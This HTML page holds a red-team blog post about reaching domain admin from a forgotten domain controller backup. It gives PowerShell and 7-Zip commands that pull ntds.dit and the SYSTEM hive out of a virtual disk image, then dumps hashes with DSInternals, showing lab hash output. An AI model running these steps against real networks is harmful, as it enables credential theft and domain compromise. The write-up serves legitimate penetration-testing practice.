

  
    
  


  




  


  

<!DOCTYPE html>
<html lang="en-us">
  <head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Hugo 0.56.0">
    <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
    <title>VHD to DA</title>
    <meta name="author" content="Rasta Mouse">
    <meta name="keywords" content="">

    <link rel="icon" href="https://rastamouse.me/favicon.ico">
    

    
    <meta name="description" content="Where a 10-year old backup can fcuk you in the ass&hellip;">
    <meta property="og:description" content="Where a 10-year old backup can fcuk you in the ass&hellip;">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="VHD to DA">
    <meta property="og:url" content="/2018/02/vhd-to-da/">
    <meta property="og:site_name" content="Rasta Mouse">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Rasta Mouse">
    <meta name="twitter:description" content="Where a 10-year old backup can fcuk you in the ass&hellip;">
    
      <meta name="twitter:creator" content="@_RastaMouse">
    
    

    
    

    
      <meta property="og:image" content="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=640">
    

    
      <meta property="og:image" content="https://rastamouse.me/images/vhd/icon.jpg">
    
    
    

    

    
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.css" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" />
    
    
    <link rel="stylesheet" href="https://rastamouse.me/css/style-u6mk0ojoywresbx8iepslrmmhl4stuhrsxuwhkpwrkrx7mryjcaimasnk4pi.min.css" />
    
    

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-60712346-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="4"> 
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://rastamouse.me/">Rasta Mouse</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://rastamouse.me/#about">
    
    
    
      
        <img class="header-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=90" alt="Author&#39;s picture" />
      
    
    </a>
  
</header>
      <nav id="sidebar" data-behavior="4">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://rastamouse.me/#about">
          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
        </a>
        <h4 class="sidebar-profile-name">Rasta Mouse</h4>
        
          <h5 class="sidebar-profile-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/categories">
    
      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
      
      <span class="sidebar-button-desc">Categories</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/tags">
    
      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
      
      <span class="sidebar-button-desc">Tags</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/archives">
    
      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
      
      <span class="sidebar-button-desc">Archives</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/#about">
    
      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
      
      <span class="sidebar-button-desc">About</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">Home</span>
    </a>
  </li>

    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://twitter.com/_RastaMouse" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
      
      <span class="sidebar-button-desc">Twitter</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://keybase.io/rasta_mouse" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-lock"></i>
      
      <span class="sidebar-button-desc">Keybase</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://zeropointsecurity.co.uk/rastalabs/" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-shield"></i>
      
      <span class="sidebar-button-desc">RastaLabs</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/rasta-mouse" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>

    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/index.xml">
    
      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
      
      <span class="sidebar-button-desc">RSS</span>
    </a>
  </li>

    </ul>
  </div>
</nav>

      

      <div id="main" data-behavior="4"
        class="
               hasCoverMetaIn
               ">
        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
          
          
            <div class="post-header main-content-wrap text-left">
  
    <h1 class="post-title" itemprop="headline">
      VHD to DA
    </h1>
  
  <div class="postShorten-meta post-meta">
  
    <time itemprop="datePublished" datetime="2018-02-16T00:00:00Z">
      
  
  
  
  
    16 February 2018
  

    </time>
  
  
  
  
    <span>in</span>
    
      <a class="category-link" href="https://rastamouse.me/categories/blog">blog</a>
    
  


</div>

</div>
          
          <div class="post-content markdown" itemprop="articleBody">
            <div class="main-content-wrap">
              <p>Where a 10-year old backup can fcuk you in the ass&hellip;</p>

<p>My favourite ways to get DA (or other elevated privilege), is by taking advantage of random stuff just lying around the environment.  I came across a brilliant example of this last week, which involved a VHD backup from a Domain Controller (you can see where this is going).</p>

<p>This wasn&rsquo;t a full outside-&gt;in attack; I had access to a legit desktop as a Domain User.</p>

<h2 id="listing-domain-shares">Listing Domain Shares</h2>

<p>We can start off by dumping all of the domain shares that the current user has read access to.</p>

<pre><code>PS C:\Users\testuser&gt; Find-DomainShare -CheckShareAccess | fl | Out-File domain-shares.txt
</code></pre>

<pre><code>PS C:\Users\testuser&gt; gc .\domain-shares.txt


Name         : Backup$
Type         : 0
Remark       :
ComputerName : dc01.testlab.local

Name         : NETLOGON
Type         : 0
Remark       : Logon server share
ComputerName : dc01.testlab.local

Name         : SYSVOL
Type         : 0
Remark       : Logon server share
ComputerName : dc01.testlab.local
</code></pre>

<p>We see an interesting hidden share called <code>Backup$</code> on <code>dc01</code>.</p>

<h2 id="find-interesting-files">Find Interesting Files</h2>

<p>Next, list the file content and verify the file permissions.</p>

<pre><code>PS C:\Users\testuser&gt; ls \\dc01\backup$


    Directory: \\dc01\backup$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       03/02/2018     14:58    10966007808 dc01.testlab.local.vdi
</code></pre>

<pre><code>PS C:\Users\testuser&gt; icacls \\dc01\backup$\dc01.testlab.local.vdi
\\dc01\backup$\dc01.testlab.local.vdi LAB\Domain Users:(I)(RX,W)
                                      NT AUTHORITY\SYSTEM:(I)(F)
                                      BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
</code></pre>

<p>These permissions are inherited from the share directory on <code>dc01</code>, and grants all Domain Users read, write and execute rights on <code>dc01.testlab.local.vdi</code>.</p>

<h2 id="extract-the-secrets">Extract the Secrets</h2>

<p>At this point, I think most articles will suggest downloading &amp; mounting the virtual image so you can extract the information you want.  There are two issues with this approach:</p>

<ul>
<li>You need local admin on Windows to mount a VHD (which you might not have in the target env).</li>
<li>VHDs are usually pretty big and a lot of data to move internally, even more so to exfil to a machine you control outside the target env.  Right <a href="https://twitter.com/424f424f">Steve</a> ;)</li>
</ul>

<p>It would be much better imo if we could just extract the two files we need directly.</p>

<h2 id="7-zip">7-Zip</h2>

<p>The 7-Zip File Manager is a great option if the circumstances allow.  I was able to drop <code>7zFM.exe</code> and <code>7z.dll</code> to the domain workstation, then extract the exact two files I wanted.</p>

<p><code>\\dc01\backup$\dc01.testlab.local.vdi\1.ntfs\Windows\NTDS\ntds.dit</code>
<code>\\dc01\backup$\dc01.testlab.local.vdi\1.ntfs\Windows\System32\config\SYSTEM</code></p>

<figure>
    <img src="https://rastamouse.me/images/vhd/7zfm.png"/> 
</figure>


<p>Better yet, you can extract these directly to your machine (rather than extracting them into the share directory and copying them across separately).</p>

<figure>
    <img src="https://rastamouse.me/images/vhd/extract.png"/> 
</figure>


<pre><code>PS C:\Users\testuser&gt; ls


    Directory: C:\Users\testuser


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       18/01/2018     20:35                Contacts
d-r---       17/02/2018     12:34                Desktop
d-r---       18/01/2018     20:35                Documents
d-r---       18/01/2018     20:35                Downloads
d-r---       18/01/2018     20:35                Favorites
d-r---       18/01/2018     20:35                Links
d-r---       18/01/2018     20:35                Music
d-r---       18/01/2018     20:35                OneDrive
d-r---       18/01/2018     20:35                Pictures
d-r---       18/01/2018     20:35                Saved Games
d-r---       18/01/2018     20:35                Searches
d-r---       18/01/2018     20:35                Videos
------       04/10/2016     17:06        1609216 7z.dll
-a----       04/10/2016     15:54         839168 7zFM.exe
-a----       17/02/2018     11:47           1140 domain-shares.txt
-a----       26/01/2018     22:01       20971520 ntds.dit
-a----       26/01/2018     22:01       12582912 SYSTEM
</code></pre>

<h2 id="dumping-creds">Dumping Creds</h2>

<p>I exfiltrated <code>ntds.dit</code> and <code>SYSTEM</code> to my external machine and decided to try the <a href="https://www.dsinternals.com/en/dumping-ntds-dit-files-using-powershell/">DS Internals</a> PowerShell modules.</p>

<p>Here&rsquo;s an example of its use:</p>

<pre><code>PS C:\Users\Rasta\Desktop&gt; $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\Users\Rasta\Desktop&gt; Get-ADDBAccount -SamAccountName 'TestUser' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Test User,CN=Users,DC=testlab,DC=local
Sid: S-1-5-21-685307900-2367635464-2133520042-1104
Guid: a7e9722e-c8e6-44d8-9718-5686adc84d5a
SamAccountName: testuser
SamAccountType: User
UserPrincipalName: testuser@testlab.local
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: False
Deleted: False
LastLogon: 17/02/2018 12:26:07
DisplayName: Test User
GivenName: Test
Surname: User
Description:
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, SelfRelative
Owner: S-1-5-21-685307900-2367635464-2133520042-512
Secrets
  NTHash: fc525c9683e8fe067095ba2ddc971889
  LMHash:
  NTHashHistory:
    Hash 01: fc525c9683e8fe067095ba2ddc971889
  LMHashHistory:
    Hash 01: fa305938fd3a4e76a2c7b1bf11a6a18a
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: dc42f9b4c525a0a145ab8303cdf8ebcf
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: a4b67915c8526476
      OldCredentials:
      Salt: TESTLAB.LOCALtestuser
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 950e12c1f1b3cf2536834550cb947ed09fc7b6e8a27371cfcadff4dc35b2e200
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 5ee798833e2dc4aca49ed9a2d816aa60
          Iterations: 4096
        DES_CBC_MD5
          Key: a4b67915c8526476
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: TESTLAB.LOCALtestuser
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: b5062942b81ab51387e6ee5444c75c98
      Hash 02: 3a3db08999164924e88823d249c8af45
      Hash 03: 0a0dc041414c282bf989424c5f948d09
      Hash 04: b5062942b81ab51387e6ee5444c75c98
      Hash 05: 3a3db08999164924e88823d249c8af45
      Hash 06: ecc6a9c1815bea8adc69877a6c9be8bb
      Hash 07: b5062942b81ab51387e6ee5444c75c98
      Hash 08: ba3981f46d68b04626c18c49664502a3
      Hash 09: ba3981f46d68b04626c18c49664502a3
      Hash 10: 9093651592378198707ea0b7b10d63c5
      Hash 11: 906bcd8e0e795d4e449114652dd8fb94
      Hash 12: ba3981f46d68b04626c18c49664502a3
      Hash 13: 044ed781762f98964f5f9fdd6a7a2724
      Hash 14: 906bcd8e0e795d4e449114652dd8fb94
      Hash 15: ca5018f3376aeb6c2a313df74dab36d5
      Hash 16: ca5018f3376aeb6c2a313df74dab36d5
      Hash 17: 4b96c357eb3bb9c7df7dcf95e67b9f4b
      Hash 18: 09e178a0ccffd3fca5b4febb8a3880a9
      Hash 19: 3d00b89bfab11a3257c5297d4d2315d0
      Hash 20: 0eac68e6c7a9a3781fef5e4ad0593016
      Hash 21: 79a1f49737bf634b2c6ff6cf33679f0d
      Hash 22: 79a1f49737bf634b2c6ff6cf33679f0d
      Hash 23: 024c49ae479c588b20353ccc777e486a
      Hash 24: fb8170f67f7f5fd79f9d9664819bf4bb
      Hash 25: fb8170f67f7f5fd79f9d9664819bf4bb
      Hash 26: ed583eb40396fbfbdb147696fbf2b537
      Hash 27: 3bd70fb036ef316b21c06ccb229be2cd
      Hash 28: e03a002b7d9197d33923078317b3e72f
      Hash 29: 77ac5a611d39db8a0a142e245e43ef16
Credential Roaming
  Created:
  Modified:
  Credentials:
</code></pre>

<p>The <code>UserAccountControl</code> field is great to target accounts that have <code>PasswordNeverExpires</code> set, then use those NTLM hashes with PTH or PSEXEC.  You could also attempt to crack the hashes to recover plaintext passwords.</p>

<p>There&rsquo;s also lots of fun to be had with the krbtgt hash, such as Golden Tickets.</p>

<h2 id="improvements">Improvements?</h2>

<p>The 7-Zip File Manager can only be used with a GUI, so what if we only had a shell?</p>

<p>There is also a command line version of 7z.</p>

<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe

7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04

Usage: 7z &lt;command&gt; [&lt;switches&gt;...] &lt;archive_name&gt; [&lt;file_names&gt;...]
       [&lt;@listfiles...&gt;]

&lt;Commands&gt;
  a : Add files to archive
  b : Benchmark
  d : Delete files from archive
  e : Extract files from archive (without using directory names)
  h : Calculate hash values for files
  i : Show information about supported formats
  l : List contents of archive
  rn : Rename files in archive
  t : Test integrity of archive
  u : Update files to archive
  x : eXtract files with full paths
</code></pre>

<p>However, you don&rsquo;t appear to be able to list or extract files in the archive recursively (even though there&rsquo;s an option for it).</p>

<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe l &quot;E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi&quot;

7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04

Scanning the drive for archives:
1 file, 32047628288 bytes (30 GiB)

Listing archive: E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi

--
Path = E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
Type = VDI
Physical Size = 32047628288
Headers Size = 2097152
Method = Dynamic
----
Size = 107374182400
Packed Size = 32045531136
--
Path = dc01.testlab.local.mbr
Type = MBR
Physical Size = 107374182400

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
                    .....    524288000    524288000  0.ntfs
                    ..... 106847797248 106847797248  1.ntfs
                    .....      1048576      1048576  2
------------------- ----- ------------ ------------  ------------------------
                          107373133824 107373133824  3 files
</code></pre>

<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e &quot;E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi&quot; -oC:\Users\Rasta\Desktop ntds.dit -r

7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04

Scanning the drive for archives:
1 file, 32047628288 bytes (30 GiB)

Extracting archive: E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
--
Path = E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
Type = VDI
Physical Size = 32047628288
Headers Size = 2097152
Method = Dynamic
----
Size = 107374182400
Packed Size = 32045531136
--
Path = dc01.testlab.local.mbr
Type = MBR
Physical Size = 107374182400


No files to process
Everything is Ok

Files: 0
Size:       0
Compressed: 32047628288
</code></pre>

<p>If anybody knows how to actually do this, I&rsquo;d love to hear from you!</p>

<p>The lame way, is to extract <code>1.ntfs</code> first.</p>

<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e &quot;E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi&quot; -oC:\Users\Rasta\Desktop 1.ntfs

7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04

Scanning the drive for archives:
1 file, 32047628288 bytes (30 GiB)

Extracting archive: E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
--
Path = E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
Type = VDI
Physical Size = 32047628288
Headers Size = 2097152
Method = Dynamic
----
Size = 107374182400
Packed Size = 32045531136
--
Path = dc01.testlab.local.mbr
Type = MBR
Physical Size = 107374182400

Everything is Ok

Size:       106847797248
Compressed: 32047628288
</code></pre>

<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe l ..\1.ntfs | more

7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04

Scanning the drive for archives:
1 file, 106847797248 bytes (100 GiB)

Listing archive: ..\1.ntfs

--
Path = ..\1.ntfs
Type = NTFS
Physical Size = 106847797248
File System = NTFS 3.1
Cluster Size = 4096
Sector Size = 512
Record Size = 1024
Created = 2018-01-15 04:09:04
ID = 5766460664093954998

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2018-01-15 04:09:04 ..HS.    110362624    110362624  [SYSTEM]\$MFT
2018-01-15 04:09:04 ..HS.         4096         4096  [SYSTEM]\$MFTMirr
2018-01-15 04:09:04 ..HS.     67108864     67108864  [SYSTEM]\$LogFile
2018-01-15 04:09:04 ..HS.            0            0  [SYSTEM]\$Volume
2018-01-15 04:09:04 ..HS.         2560         4096  [SYSTEM]\$AttrDef
2018-02-15 20:13:10 D.HS.                            [SYSTEM]\.
2018-01-15 04:09:04 ..HS.      3260736      3264512  [SYSTEM]\$Bitmap
2018-01-15 04:09:04 ..HS.         8192         8192  [SYSTEM]\$Boot
-- More  --
</code></pre>

<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e ..\1.ntfs -oC:\Users\Rasta\Desktop Windows\NTDS\ntds.dit

7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04

Scanning the drive for archives:
1 file, 106847797248 bytes (100 GiB)

Extracting archive: ..\1.ntfs
--
Path = ..\1.ntfs
Type = NTFS
Physical Size = 106847797248
File System = NTFS 3.1
Cluster Size = 4096
Sector Size = 512
Record Size = 1024
Created = 2018-01-15 04:09:04
ID = 5766460664093954998

Everything is Ok

Size:       20971520
Compressed: 106847797248
</code></pre>

<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e ..\1.ntfs -oC:\Users\Rasta\Desktop Windows\System32\config\SYSTEM

7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04

Scanning the drive for archives:
1 file, 106847797248 bytes (100 GiB)

Extracting archive: ..\1.ntfs
--
Path = ..\1.ntfs
Type = NTFS
Physical Size = 106847797248
File System = NTFS 3.1
Cluster Size = 4096
Sector Size = 512
Record Size = 1024
Created = 2018-01-15 04:09:04
ID = 5766460664093954998

Everything is Ok

Size:       12582912
Compressed: 106847797248
</code></pre>
              
            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">TAGGED IN</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/red-team/">red team</a>

                  </div>
                
              
            
            <div class="post-actions-wrap">
  <nav>
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/02/red-team-infrastructure-aws-encrypted-ebs/" data-tooltip="Red Team Infrastructure - AWS Encrypted EBS">
          
            <i class="fa fa-angle-left"></i>
            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
          </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform-part-2/" data-tooltip="Automated Red Team Infrastructure Deployment with Terraform - Part 2">
          
            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
            <i class="fa fa-angle-right"></i>
          </a>
        </li>
      
    </ul>
  </nav>
  <ul class="post-actions post-action-share">
    
      <li class="post-action hide-lg hide-md hide-sm">
        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
          <i class="fa fa-share-alt"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
          <i class="fa fa-google-plus"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
          <i class="fa fa-facebook-official"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
          <i class="fa fa-twitter"></i>
        </a>
      </li>
    
    
      <li class="post-action">
        <a class="post-action-btn btn btn--default" href="#disqus_thread">
          <i class="fa fa-comment-o"></i>
        </a>
      </li>
    
    <li class="post-action">
      
        <a class="post-action-btn btn btn--default" href="#">
      
        <i class="fa fa-list"></i>
      </a>
    </li>
  </ul>
</div>


            
              
                <div id="disqus_thread">
  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
              
            
          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
    &copy; 2020 Rasta Mouse. All Rights Reserved
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
        <div class="post-actions-wrap">
  <nav>
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/02/red-team-infrastructure-aws-encrypted-ebs/" data-tooltip="Red Team Infrastructure - AWS Encrypted EBS">
          
            <i class="fa fa-angle-left"></i>
            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
          </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform-part-2/" data-tooltip="Automated Red Team Infrastructure Deployment with Terraform - Part 2">
          
            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
            <i class="fa fa-angle-right"></i>
          </a>
        </li>
      
    </ul>
  </nav>
  <ul class="post-actions post-action-share">
    
      <li class="post-action hide-lg hide-md hide-sm">
        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
          <i class="fa fa-share-alt"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
          <i class="fa fa-google-plus"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
          <i class="fa fa-facebook-official"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
          <i class="fa fa-twitter"></i>
        </a>
      </li>
    
    
      <li class="post-action">
        <a class="post-action-btn btn btn--default" href="#disqus_thread">
          <i class="fa fa-comment-o"></i>
        </a>
      </li>
    
    <li class="post-action">
      
        <a class="post-action-btn btn btn--default" href="#">
      
        <i class="fa fa-list"></i>
      </a>
    </li>
  </ul>
</div>


      </div>
      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
  <ul class="share-options">
    <li class="share-option">
      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
        <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
      </a>
    </li>
    <li class="share-option">
      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
        <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
      </a>
    </li>
    <li class="share-option">
      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
        <i class="fa fa-twitter"></i><span>Share on Twitter</span>
      </a>
    </li>
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>
    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-remove"></i>
    </div>
    
      <img id="about-card-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
    
    <h4 id="about-card-name">Rasta Mouse</h4>
    
      <div id="about-card-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        Penetration Tester
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker"></i>
        <br/>
        UK
      </div>
    
  </div>
</div>

    <div id="algolia-search-modal" class="modal-container">
  <div class="modal">
    <div class="modal-header">
      <span class="close-button"><i class="fa fa-close"></i></span>
      <a href="https://algolia.com" target="_blank" class="searchby-algolia text-color-light link-unstyled">
        <span class="searchby-algolia-text text-color-light text-small">by</span>
        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
      </a>
      <i class="search-icon fa fa-search"></i>
      <form id="algolia-search-form">
        <input type="text" id="algolia-search-input" name="search"
          class="form-control input--large search-input" placeholder="Search" />
      </form>
    </div>
    <div class="modal-body">
      <div class="no-result text-color-light text-center">no post found</div>
      <div class="results">
        
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/post/">
                <h3 class="media-heading">Posts</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  May 5, 2020
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2020/05/sharpc2/">
                <h3 class="media-heading">SharpC2</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  May 5, 2020
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>Back in October 2018 (yes, 2018!), I <del>approached</del> begged <a href="https://twitter.com/_xpn_">xpn</a> for a collaboration on an idea I had for a .NET C2 Framework.  We worked on the project for about a month or so before real life got in the way and stalled development.  In February 2019, <a href="https://twitter.com/cobbr_io">cobbr</a> released <a href="https://github.com/cobbr/Covenant">Covenant</a> which is also a .NET C2 Framework.  I subsequently spent some time <a href="https://github.com/cobbr/Covenant/commits?author=rasta-mouse">contributing</a> to, and <a href="https://rastamouse.me/tags/covenant/">writing about</a> Covenant - but I&rsquo;ve always wanted to get back to our original project.</p>

<p>I decided to re-visit SharpC2 (a very creative name on my part) over the 2019 Christmas period to try and get it into a position where we could release a proof of concept.  Yet somehow I&rsquo;m not writing this until May 2020!  We can blame my <a href="https://www.zeropointsecurity.co.uk/annoucements/2020/4/13/red-team-ops-is-back">RTO course</a> for that.</p>

<p>This post is intended to provide an overview of SharpC2&rsquo;s design concepts and some showcase examples of how it can be used.  Code can be found on <a href="https://github.com/SharpC2/SharpC2/tree/dev">GitHub</a>.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2020/02/gadgettojscript/">
                <h3 class="media-heading">GadgetToJScript</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Feb 2, 2020
                </span>
